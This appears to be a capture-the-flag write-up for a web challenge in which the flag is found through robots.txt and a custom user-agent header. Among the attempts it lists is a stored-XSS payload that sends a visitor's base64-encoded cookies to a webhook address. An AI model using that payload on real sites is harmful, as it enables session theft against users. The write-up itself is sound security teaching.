# Secret Agent (500p)
## Challenge Description  

<em> In the world of spies, secrets are a part of your living. Someone that is more that familliar with this is Ghost. Ghost has handled some of the most notorious and famour spies through all times. Does James Bond and Natasha Romanoff ring any bells? Well, they should.

How did they (and so many more) become so successful in their line of duty? They had help of course! By no other than Ghost. While they've been showing off in the spotlights, he's been there in the background.

Since he hates robots and AI, we have had the honor of having him joining our ranks in the war against the machines. Ghost only communicate and share his secrets (that his double agents provides him with) through a secure commiuncation channels.

He is, however, secrative and will not spill any of his beans to anyone he belives to be a robot that is just probing him for information. We know that he has some secret to share, please convince him that you are human and it will be worth all the candy in the world.

Note: This challenge will reset every 15 minutes.

Author: Jimmie Rudvall
https://secret-agent.appsec.nu </em>

## Thought Process
- "There is user input, it must be something related to that, like XSS or SQLi!" I found unfiltered stored XSS and could do a cookie stealer attack with `<img src="lol" onerror=window.location="*my_webhook.site_address*/?cookie="+btoa(document.cookie)>`, but with no one else visiting the page (session was unique to your current PHPSESSID cookie), I could only steal my own cookie.
- Desc hints at Ghost only communicating through secure channels, so I tried both http and https as well as modifying `Httponly` and `Secure` attributes of the cookie to `True`
- Desc hints at Ghost hating robots, so desperately use stored XSS to modify my appeared name and profile picture in the chat into something that is more "human"
- Landing page is `index.php`, desperately try `index.html`. It works, a different page! (This was just another rabbithole...)
- Description says something about hating robots, so try "Human" as user agent maybe?
- Throwing pretty much everything I got at the app (too much to list), while re-reading the description for potential missed hints every 30 minutes
- `gobuster` (directory enumeration tool) with several extensions (for example `.txt`,`.php`,`.js`) overload the server and cause requests to fail. A very useful tool, but not usually for CTF:s as it becomes stressful for the servers, and as such, challengemakers don't construct challenges with brute-forcing as the intended solution. I try anyway in desperation, without the extensions to get it to complete, and I find `index.html`(which I had already manually found) and `robots.txt`... Oh no, don't tell me ...

## Solution
1. Once again: less is more. Check out `/robots.txt` where we are informed of an allowed user-agent: `I-Solemnly-Swear-That-I-Am-No-Robot`. (Checking out `/robots.txt` is a common step in the enumeration phase of a web pentest, as it is easy to do and can provide valuable info regarding the structure of the site. Do not be like me and neglect this simple yet crucial thing for the longest time.)
2. Request `index.php` with the special user-agent (Can be done with a proxy service like `Burpsuite`, with `curl` or even in the Network tab of the browser inspector), and the flag is there.
